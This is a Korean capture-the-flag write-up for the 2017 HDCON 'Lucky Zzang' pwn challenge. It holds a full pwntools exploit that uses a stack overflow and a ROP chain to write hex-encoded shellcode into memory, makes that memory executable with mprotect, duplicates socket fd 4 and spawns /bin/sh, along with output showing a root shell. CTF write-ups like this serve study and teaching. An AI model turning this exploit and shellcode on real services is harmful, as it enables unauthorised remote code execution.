# [2017_HDCON] \[PWN] Lucky Zzang Write-up using Shellcode

\* 편의를 위해 시스템의 ASLR을 꺼놓고 Exploit을 진행했습니다.

### 시나리오

1. 쉘코드를 올릴 적절한 메모리 주소를 찾는다.
2. mprotect 함수를 호출하여 해당 메모리에 권한을 rwx로 준다.
3. 해당 메모리에 쉘코드를 올린다.
4. 해당 메모리로 점프한다.
5. 다만, io를 fd 4를 통해서만 주고 받을 수 있기 때문에 /bin/sh를 실행시키는 쉘코드만 올려서는 안된다. 그 전에 dup 함수를 통해 fd를 복제해둔다.

 (http://passket.tistory.com/ - 심준보 멘토님의 블로그에 의하면 vmmap에서는 보여주지 않지만 rwx인 메모리가 있다고 한다. 하지만 이는 리눅스 버전별로 다르고 0x1000단위로 메모리에 쉘코드를 넣어서 실행시켜보는 식으로 찾아보려고 했으나 시간이 굉장히 많이 걸릴 듯하여 생략했다. 나중에 시간이 되면 찾아보도록 하겠다.)

### CODE

```python
from pwn import *
import sys, time

if (len(sys.argv) != 2):
	print "input cmd"
	exit()

ret = 0x80484bb
popret = 0x80484dc
pop2ret = 0x80486a2
pop4ret = 0x80489cc
pop3ret = 0x804878d
recv_plt = 0x080485F0
recv_got = 0x0804A040
send_plt = 0x08048610
puts_plt = 0x08048550
puts_got = 0x0804A018
data = 0xf7ffd000
func = 0x080486F3
system = 0xf7e4bda0

libcbase = 0xf7e11000
mprotect = libcbase+0xe2d50

shellcode = "6a045b6a0359496a3f58cd8075f86a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80".decode("hex")

payload ="a"*(0x408+4)
payload+=p32(recv_plt)		# write shellcode in data section
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(data)
payload+=p32(len(shellcode))
payload+=p32(0)
payload+=p32(send_plt)
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(data)
payload+=p32(len(shellcode))
payload+=p32(0)
payload+=p32(mprotect)
payload+=p32(data)
payload+=p32(data)
payload+=p32(0xff)
payload+=p32(0x7)

while True:
	s = connect("stealthee.kr", 7777)
	try:
		s.recv()
		s.send(payload)
		time.sleep(0.5)
		s.send(shellcode)
		s.send(sys.argv[1])
		s.recv()
		log.info("SUCCESSFUL TO EXPLOIT")
		break
	except Exception as e:
		s.close()
		continue
s.interactive()
```



### 실행 결과

```python
root@inj3ct:~/bob# python ass01_shellcode.py id
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] Closed connection to stealthee.kr port 7777
[+] Opening connection to stealthee.kr on port 7777: Done
[*] SUCCESSFUL TO EXPLOIT
[*] Switching to interactive mode
$ 
uid=0(root) gid=0(root) groups=0(root)
```



### 